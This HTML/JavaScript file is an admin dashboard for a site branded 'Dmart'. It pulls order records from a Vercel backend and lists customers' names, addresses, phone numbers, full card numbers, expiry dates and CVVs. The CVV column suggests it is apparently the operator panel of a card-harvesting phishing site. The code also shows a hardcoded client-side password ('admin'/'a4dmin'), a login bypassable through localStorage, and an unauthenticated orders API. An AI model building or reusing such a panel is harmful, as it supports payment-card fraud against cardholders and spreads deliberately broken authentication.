<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="googlef563f12e6ebc5611.html">
  <title>Admin Panel - Dmart</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script defer src="/_vercel/insights/script.js"></script>
</head>
<body class="bg-gray-100">
  
  <!-- Login Section -->
  <div id="login-section" class="min-h-screen flex items-center justify-center">
    <div class="bg-white p-8 rounded-lg shadow-md w-96">
      <h1 class="text-2xl font-bold mb-6 text-center">Admin Login</h1>
      <form id="login-form">
        <div class="mb-4">
          <label class="block text-sm font-medium mb-2">Username</label>
          <input type="text" id="username" class="w-full border rounded-lg p-3" required>
        </div>
        <div class="mb-6">
          <label class="block text-sm font-medium mb-2">Password</label>
          <input type="password" id="password" class="w-full border rounded-lg p-3" required>
        </div>
        <button type="submit" class="w-full bg-green-600 text-white font-bold py-3 rounded-lg">Login</button>
        <p id="error-msg" class="text-red-500 text-sm mt-2 hidden">Invalid credentials</p>
      </form>
    </div>
  </div>

  <!-- Admin Panel Section -->
  <div id="admin-section" class="hidden min-h-screen p-4 md:p-8">
    <div class="max-w-7xl mx-auto">
      <div class="flex flex-col md:flex-row justify-between items-center mb-6 md:mb-8 gap-4">
        <h1 class="text-2xl md:text-3xl font-bold">Orders Dashboard</h1>
        <button id="logout-btn" class="bg-red-500 text-white px-6 py-2 rounded-lg w-full md:w-auto">Logout</button>
      </div>

      <div class="bg-white rounded-lg shadow-md overflow-hidden">
        <div class="overflow-x-auto">
          <table class="w-full min-w-max">
            <thead class="bg-gray-50">
              <tr>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">ID</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Name</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Phone</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Address</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Card Number</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Expiry</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">CVV</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Cardholder</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Amount</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Date</th>
                <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Action</th>
              </tr>
            </thead>
            <tbody id="orders-table" class="divide-y divide-gray-200">
              <tr><td colspan="11" class="px-3 md:px-6 py-4 text-center text-gray-500">Loading...</td></tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>

  <script>
    const API_URL = 'https://dmart-backend-opal.vercel.app';

    // Check login status on page load
    function checkLoginStatus() {
      const isLoggedIn = localStorage.getItem('adminLoggedIn') === 'true';
      if (isLoggedIn) {
        document.getElementById('login-section').classList.add('hidden');
        document.getElementById('admin-section').classList.remove('hidden');
        loadOrders();
      }
    }

    // Login
    document.getElementById('login-form').addEventListener('submit', (e) => {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      if (username === 'admin' && password === 'a4dmin') {
        // Save login state to localStorage
        localStorage.setItem('adminLoggedIn', 'true');
        document.getElementById('login-section').classList.add('hidden');
        document.getElementById('admin-section').classList.remove('hidden');
        loadOrders();
      } else {
        document.getElementById('error-msg').classList.remove('hidden');
      }
    });

    // Logout
    document.getElementById('logout-btn').addEventListener('click', () => {
      // Clear login state from localStorage
      localStorage.removeItem('adminLoggedIn');
      document.getElementById('admin-section').classList.add('hidden');
      document.getElementById('login-section').classList.remove('hidden');
      document.getElementById('login-form').reset();
    });

    // Check login status when page loads
    document.addEventListener('DOMContentLoaded', checkLoginStatus);

    // Load Orders
    async function loadOrders() {
      try {
        // Always use Vercel backend
        const apiUrl = `${API_URL}/api/orders`;
        
        console.log('Loading orders from:', apiUrl);
        const res = await fetch(apiUrl);
        const data = await res.json();
        
        if (data.orders && data.orders.length > 0) {
          document.getElementById('orders-table').innerHTML = data.orders.map(order => `
            <tr>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm">${order.id}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm">${order.name}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm">${order.phone}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm">${order.address}, ${order.city}, ${order.state} - ${order.pincode}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm font-mono">${order.card_number}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm">${order.expiry}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm">${order.cvv}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm">${order.cardholder_name}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm font-bold">₹${order.amount}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm">${new Date(order.created_at).toLocaleString('en-IN')}</td>
              <td class="px-3 md:px-6 py-4 text-xs md:text-sm">
                <button onclick="deleteOrder(${order.id})" class="bg-red-500 text-white px-3 md:px-4 py-1 rounded text-xs md:text-sm">Delete</button>
              </td>
            </tr>
          `).join('');
        } else {
          document.getElementById('orders-table').innerHTML = '<tr><td colspan="11" class="px-6 py-4 text-center text-gray-500">No orders found</td></tr>';
        }
      } catch (error) {
        console.error('Error loading orders:', error);
        document.getElementById('orders-table').innerHTML = '<tr><td colspan="11" class="px-6 py-4 text-center text-red-500">Error loading orders</td></tr>';
      }
    }

    // Delete Order
    async function deleteOrder(id) {
      if (!confirm('Are you sure you want to delete this order?')) return;
      
      try {
        // Always use Vercel backend
        const apiUrl = `${API_URL}/api/orders/${id}`;
        
        console.log('Deleting order from:', apiUrl);
        const res = await fetch(apiUrl, { method: 'DELETE' });
        const data = await res.json();
        
        if (data.ok) {
          loadOrders();
        } else {
          alert('Failed to delete order');
        }
      } catch (error) {
        console.error('Error deleting order:', error);
        alert('Error deleting order');
      }
    }
  </script>
</body>
</html>
